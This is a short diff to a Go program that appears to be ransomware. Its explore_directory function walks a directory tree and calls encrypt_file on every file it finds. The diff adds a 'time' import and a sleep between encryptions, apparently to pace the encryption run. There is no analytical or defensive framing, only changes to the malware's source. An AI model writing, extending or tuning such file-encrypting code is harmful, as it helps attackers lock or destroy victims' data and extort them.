@@ -10,6 +10,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"runtime"
+ "time" 
 	// "log" // uncomment this line and the log.Fatal() debug lines inside the code, if needed :)
 )
 
@@ -99,6 +100,7 @@ func explore_directory(parent_dir string) {
 	err := filepath.WalkDir(parent_dir, func(path string, file fs.DirEntry, err error) error {
 		if !file.IsDir() { // it's a file, not a directory
 			encrypt_file(path)
+   time.Sleep(300)
 		} else {
 		} // don't encrypt the folder (but the files inside, see the 'if' block)
 		return nil
